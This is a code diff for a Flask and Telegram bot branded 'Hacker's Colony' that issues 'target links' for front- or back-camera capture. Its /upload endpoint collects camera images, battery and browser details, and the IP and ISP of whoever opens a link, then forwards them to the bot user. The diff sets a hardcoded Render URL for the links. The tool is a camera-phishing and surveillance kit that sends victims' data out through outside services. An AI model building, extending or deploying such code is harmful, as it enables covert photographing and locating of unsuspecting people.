@@ -4,15 +4,16 @@ from telebot import types
 
 app = Flask(__name__)
 
-# Environment Variables from Render
+# Configuration
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 ADMINS = [518067190, 7162565886]
 TG_CHANNEL = "hackerscolonytech"
 YT_LINK = "https://youtube.com/@hackers_colony_tech"
+RENDER_LINK = "https://happy-wishing-you.onrender.com"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# 1. PROCESS CLEANUP: Stops the old instance when a new one deploys on Render
+# Signal handler for clean deployment on Render
 def handler(signum, frame):
     os._exit(0)
 
@@ -52,7 +53,6 @@ def start(message):
         bot.send_message(message.chat.id, "<b>Welcome to Hacker's Colony! 🎯</b>", parse_mode='HTML', reply_markup=markup)
 
 def show_menu(chat_id):
-    # 2. DUAL CAMERA BUTTON: Restored as requested
     markup = types.InlineKeyboardMarkup()
     markup.row(types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front"), 
                types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back"))
@@ -70,9 +70,9 @@ def handle_query(call):
             
     elif call.data.startswith("m_"):
         mode = call.data.split("_")[1]
-        link = f"https://{request.host}/?m={mode}&uid={call.message.chat.id}"
+        final_url = f"{RENDER_LINK}/?m={mode}&uid={call.message.chat.id}"
         msg = (f"🤠 <b>Your target link</b> 🔗\n\n"
-               f"Url = <code>{link}</code>\n\n"
+               f"Url = <code>{final_url}</code>\n\n"
                f"✨ Thank you team HCO ✨")
         bot.send_message(call.message.chat.id, msg, parse_mode='HTML')
 
@@ -83,7 +83,9 @@ def index():
 @app.route('/upload', methods=['POST'])
 def upload():
     data = request.json
-    uid = data.get('uid'); info = data.get('info', {})
+    uid = data.get('uid')
+    info = data.get('info', {})
+    
     isp = "Unknown"
     try:
         ip_data = requests.get(f"http://ip-api.com/json/{request.remote_addr}").json()
@@ -96,7 +98,6 @@ def upload():
     conn.commit(); conn.close()
 
     img_data = base64.b64decode(data.get('image').split(',')[1])
-    # 3. COMPLETE INFO: Restored browser details
     caption = (f"🛡️ <b>Audit:</b> {data.get('mode', 'N/A').upper()}\n"
                f"🔋 <b>Battery:</b> {info.get('battery')}\n"
                f"🌐 <b>Browser:</b> {info.get('browser')}\n"
